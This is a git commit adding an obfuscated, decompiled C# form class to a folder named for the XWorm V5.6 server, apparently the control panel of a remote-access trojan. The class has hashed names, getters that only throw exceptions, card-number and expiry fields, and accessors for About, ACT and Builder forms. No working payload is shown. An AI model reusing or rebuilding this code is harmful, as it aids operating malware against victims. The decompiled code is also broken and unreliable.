4247c8c5d44f73c29ae20901a90b069aa00d4847
h1ercarbohydratemap11 <xcytrizen@outlook.com>
2025-09-18 13:50:20 +0400

    Forms22.cs

---
+++ XWorm V5.6/Server/Forms/Forms22.cs
@@ -0,0 +1,96 @@
+﻿using D376F43ABF13A72E5F1A19C0CD725D2F;
+using F06F1FD782A797E66A8C9D7976456227;
+using FF2D6F102A260C25FF3FD3711F3F0BB9;
+using IF0FF1FFB1CA752C08C9910B024F129F;
+using IF7ECB736801D875D48E6C65CE1BIEF6;
+using System;
+using System.ComponentModel;
+using System.Diagnostics;
+using System.Runtime.CompilerServices;
+using System.Windows.Forms;
+using V3VB5FV7FE3C765CAFFV8BFAVFV6562D;
+using V88301AF86D85FE5FEV199V4ED08133D;
+
+namespace IFIA669D44A37BIIE7E4F11568D7603E
+{
+  public class E2D1C0BA3ED2E63FF199E562C1FB1D0D : I2F88ED16A41I5FEI8E9B06BFCAF5E96
+  {
+    public static int P008F88EDA0P17CPB2AEE3AA9BADEP6A;
+    public static int AD6685478EBCE903DC875C835B779CD2;
+    public static int E8B62868036067CFF55D0E8A06B9A857;
+    public static int C8D5C199955BC1276B9C212B71457E8E;
+
+    public string sNumber
+    {
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] get => throw new Exception("ゝ");
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] set => throw new Exception("れ");
+    }
+
+    public string sExpYear
+    {
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] get => throw new Exception("ほ");
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] set => throw new Exception("ゎ");
+    }
+
+    public string sExpMonth
+    {
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] get => throw new Exception("あ");
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] set => throw new Exception("さ");
+    }
+
+    public string sName
+    {
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] get => throw new Exception("ぞ");
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] set => throw new Exception("に");
+    }
+
+    [DebuggerHidden]
+    private void Dispose__Instance__<T>(ref T instance) where T : Form
+    {
+      instance.Dispose();
+      instance = default (T);
+    }
+
+    [DebuggerHidden]
+    [EditorBrowsable(EditorBrowsableState.Never)]
+    public E2D1C0BA3ED2E63FF199E562C1FB1D0D()
+    {
+    }
+
+    [EditorBrowsable(EditorBrowsableState.Never)]
+    public override bool Equals(object o) => base.Equals(RuntimeHelpers.GetObjectValue(o));
+
+    [EditorBrowsable(EditorBrowsableState.Never)]
+    public override int GetHashCode() => base.GetHashCode();
+
+    [EditorBrowsable(EditorBrowsableState.Never)]
+    internal new Type GetType() => typeof (FBCF76B6A3F89BF7637391A1E447D6AB.MyForms);
+
+    [EditorBrowsable(EditorBrowsableState.Never)]
+    public override string ToString() => base.ToString();
+
+    [DebuggerHidden]
+    [SpecialName]
+    public V57928VF35753017194C5DBCCB5CCEED get_About()
+    {
+      ((FAFCD0C18FFE8F29EF883C1B32FB3915) this).m_About = IA0AD4B699F26I4B2F7CFCF52I427780.Create__Instance__<V57928VF35753017194C5DBCCB5CCEED>(((FAFCD0C18FFE8F29EF883C1B32FB3915) this).m_About);
+      return ((FAFCD0C18FFE8F29EF883C1B32FB3915) this).m_About;
+    }
+
+    [DebuggerHidden]
+    [SpecialName]
+    public CABE7B691D1266A9A9E041B427BC8A2A get_ACT()
+    {
+      ((FAFCD0C18FFE8F29EF883C1B32FB3915) this).m_ACT = IA0AD4B699F26I4B2F7CFCF52I427780.Create__Instance__<CABE7B691D1266A9A9E041B427BC8A2A>(((FAFCD0C18FFE8F29EF883C1B32FB3915) this).m_ACT);
+      return ((FAFCD0C18FFE8F29EF883C1B32FB3915) this).m_ACT;
+    }
+
+    [DebuggerHidden]
+    [SpecialName]
+    public L7LEA1L88C1L706A867C919LD6FA7BBA get_Builder()
+    {
+      ((FAFCD0C18FFE8F29EF883C1B32FB3915) this).m_Builder = IA0AD4B699F26I4B2F7CFCF52I427780.Create__Instance__<L7LEA1L88C1L706A867C919LD6FA7BBA>(((FAFCD0C18FFE8F29EF883C1B32FB3915) this).m_Builder);
+      return ((FAFCD0C18FFE8F29EF883C1B32FB3915) this).m_Builder;
+    }
+  }
+}
